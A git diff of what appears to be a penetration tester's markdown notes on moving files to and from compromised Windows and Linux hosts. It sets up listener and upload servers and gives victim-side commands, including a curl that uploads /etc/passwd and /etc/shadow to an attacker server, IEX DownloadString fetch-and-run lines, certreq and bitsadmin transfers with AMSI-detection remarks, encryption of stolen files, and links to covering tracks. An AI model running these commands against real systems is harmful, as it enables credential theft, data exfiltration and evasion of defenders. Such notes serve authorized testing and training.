@@ -2,35 +2,67 @@
 tags:
   - fileless-execution
   - "#pseudo-networks"
+  - self-signed-certificates
 ---
-# Python Server:
+> **!! NOTE:** User-Agent can be blocked for each tool when accessing remote resource. Refer GTFObins or LOLBAS to find available binaries to transfer data.
+# Servers
+## Python Server:
 ```shell-session
 $ python3 -m http.server [<PORT>]
 $ python2.7 -m SimpleHTTPServer
 ```
-# SMB Server:
+```shell-session
+$ python3 -m uploadserver [<PORT>] --server-certificate ~/<key>.pem
+```
+Refer #self-signed-certificates to create such certs.
+## SMB Server:
 ```shell-session
 $ sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
-$ sudo impacket-smbserver -smb2support share $(pwd) -user '' -password ''
+$ sudo impacket-smbserver -smb2support share $(pwd) [-user ''] [-password '']
 ```
-
-# LDAP Server
+## Nginx Server
+Create `/etc/nginx/sites-available/upload.conf` with the contents:
+```nginx
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+```shell-session
+$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+$ sudo systemctl restart nginx.service
+```
+## LDAP Server
 ```shell-session
 $ java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
 ```
-# FTP Server
+## FTP Server
 ```shell-session
 $ python3 -m pyftpdlib -w
 ```
-# PHP Server
+## PHP Server
 ```shell-session
 $ php -S 0.0.0.0:8000
 ```
-# Ruby Server
+## Ruby Server
 ```shell-session
 $ ruby -run -ehttpd . -p8000
 ```
-
+## Netcat
+```shell-session
+$ nc -nlvp <PORT>
+```
+### OpenSSL
+Refer #self-signed-certificates 
+```shell-session
+$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <file>
+```
 # Windows Client
 ## Net
 - SMB
@@ -53,6 +85,11 @@ PS > Invoke-WebRequest https://<ip>[:PORT]/file -UseBasicParsing
 ## Certutil
 ```powershell
 PS > certutil -urlcache -f http://IP:PORT/file file_local
+```
+>**!! Note:** AMSI detects this as malicious
+### BITSadmin
+```powershell
+PS > bitsadmin /transfer wcb /priority foreground http://<IP>[:<PORT>]/file <file-to-send>
 ```
 ## Net.WebClient
 - HTTP(s)
@@ -137,7 +174,17 @@ end with
 ```
 # Linux Client
 ## cURL
+```shell-session
+$ curl http://<IP>[:<PORT>]/file -o <output-file>
+```
 ## Wget
+```shell-session
+$ wget http://<IP>[:<PORT>]/file
+```
+### OpenSSL
+```shell-session
+$ openssl s_client -connect <IP>:<PORT> -quiet > file
+```
 ## Netcat
 On Linux:
 ```shell-session
@@ -224,7 +271,7 @@ $ curl -x socks5://127.0.0.1:LPORT https://127.0.0.1:RPORT
 **Possible pathways after data-infiltration:**
 - **[[Windows Privesc.]]**
 # Exfiltration
-## from Windows
+## From Windows
 ### Base64
 - From Windows
 ```powershell
@@ -236,11 +283,7 @@ PS > Get-FileHash "C:\Path-to\file" -Algorithm MD5 | select Hash
 $ echo 'base64 string' | base64 -d
 ```
 ### Web Uploads
--> On kali
-```shell-session
-$ python3 -m uploadserver
-```
-- From Windows
+Create one from any [[#Servers]], and upload from Windows victim machine:
 ```powershell
 PS > IEX(New-Object Net.WebClient).DownloadString('https://IP[:PORT]/Path-to/PSUpload.ps1')
 PS > Invoke-FileUpload -Uri http://IP[:PORT]/upload -File C:\Path-to\file
@@ -248,6 +291,15 @@ PS > Invoke-FileUpload -Uri http://IP[:PORT]/upload -File C:\Path-to\file
 ```powershell
 PS > Invoke-WebRequest -Uri 'http://<IP>[:<PORT>]/upload' -Method POST -InFile '.\file' -ContentType 'multipart/form-data'
 PS > Invoke-RestMethod -Uri 'http://<IP>[:<PORT>]/upload' -Method POST -InFile '.\file' -ContentType 'multipart/form-data'
+```
+### CertReq
+Used with [[#Servers#Netcat]]
+```powershell
+> certreq.exe -Post -config http://<IP>[:<PORT>]/ file
+```
+### BITSadmin
+```powershell
+PS > Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
 ```
 ### Base64 + WebRequest/RestMethod
 ```powershell
@@ -262,24 +314,21 @@ $ nc -nlvp PORT
 ```powershell
 PS > (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/file', 'C:\Local\path\to\file'
 ```
-## from Linux
+## From Linux
 ### Web Upload
--> In kali:
-```shell-session
-$ python3 -m uploadserver [<PORT>] --server-certificate ~/server.pem
-```
-- From Linux:
+Create one from any [[#Servers]], and upload from victim machine
 ```shell-session
 $ curl -X POST https://<IP>[:<PORT>]/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 `--insecure` if we use #self-signed-certificates 
 ```shell-session
+$ curl -T <file> http://<IP>[:<PORT>]/SecretUploadDirectory/file
+```
+```shell-session
 $ python3 -c 'import requests;requests.post("http://<IP>[:<PORT>]/upload",files={"files":open("file","rb")})'
 ```
 ### Web Download
-- [[#Python Server]]
-- [[#PHP Server]]
-- [[#Ruby Server]]
+- Create one from any [[#Servers]] present in victim, and download from attacker machine
 # Limited Data Transfer
 Windows command-line support upto 8,191 characters and the webshell may error out if sending large strings
 -> From Kali:
@@ -291,11 +340,24 @@ $ cat id_rsa |base64 -w 0;echo
 PS > [IO.File]::WriteAllBytes("C:\Save\location", [Convert]::FromBase64String("<base64-string>")
 ```
 Confirm with #md5 hashsum
+# Protected Data Transfer
+- `Invoke-AESEncryption`: Refer #aes KB for usage.
+```powershell
+PS > Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Text "<PLAIN>" 
+PS > Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Text "<ENCRYPTED>"
+PS > Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Path file.bin
+PS > Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Path file.bin.aes
+```
+- OpenSSL
+```shell-session
+$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
 
-**Possible pathways after Exfil:**
 
+# **Possible pathways after Exfil:**
 
 | Pathway 1              | Pathway 2                    |
 | ---------------------- | ---------------------------- |
-| [[Clean Logs]]         | [[Operation Plan#Reporting]] |
+| [[Covering Tracks]]         | [[Operation Plan#Reporting]] |
 | Timestamp Modification | Stakeholder Communication    |
